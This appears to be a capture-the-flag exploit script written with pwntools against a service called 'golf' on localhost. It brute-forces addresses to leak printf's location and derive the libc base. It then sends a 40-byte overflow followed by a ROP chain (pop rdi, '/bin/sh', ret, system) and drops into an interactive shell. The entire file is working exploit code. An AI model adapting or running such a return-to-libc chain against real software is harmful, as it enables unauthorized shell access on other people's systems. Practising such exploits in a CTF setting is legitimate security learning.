#!/usr/bin/env python3

from pwn import *

offset = 40

#exe = ELF("./golf")
libc = ELF("./libc.so.6")


context.binary = libc


def conn():
    if args.LOCAL:
        r = process([exe.path])
#    else:
#        r = gdb.debug([exe.path])
    else:
       r = remote("localhost", 15590)

    return r


def main():
    r = conn()
 
#    r.interactive()
    #r.recvuntil(b"Please stay within the borders: ")
    print(r.recvuntil(b"borders: "))
    borders = str(r.recvline()).strip("b'n\\").split(" ")

    for i in range(1,1000000):
        #print(i)
        address = hex(int(borders[2],16)+int(str(i),16))
        #print(address)

        r.send(address+"\n")

        result = r.recvuntil(b"(hex):")

        if b"ball" in result:
           print(result)

        if b"_IO_printf" in result:
            print(result)
            printf_loc = int(result.split(b" ")[11].split(b"\n")[0],16)
            print(printf_loc)
            libc.address = printf_loc - libc.symbols['_IO_printf']
            print("libc:",hex(libc.address))
            break



    pop_rdi = libc.address + 0x000000000002a3e5
    print(hex(pop_rdi))
    system = libc.symbols['system']
    bin_sh = next(libc.search('/bin/sh'))


    rop = ROP(libc)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

    ret = rop.find_gadget(['ret'])[0]


    print("pop rdi:",hex(pop_rdi))
    print("bin_sh:",hex(bin_sh))
    print("ret:",hex(ret))
    print("system:",hex(system))

    payload = b"A"*40
 #   payload += b"B"*6
    payload += p64(pop_rdi)
    payload += p64(bin_sh)
    payload += p64(ret)
    payload += p64(system)


    print(r.recvuntil(b"(hex):"))
    print(payload)
    #r.sendline(b"q")
    #print("QUit?")
    #print(r.recvuntil(b"(y/N): "))
    r.sendline(payload)

    #print(borders)
    # good luck pwning :)
    r.interactive()


if __name__ == "__main__":
    main()
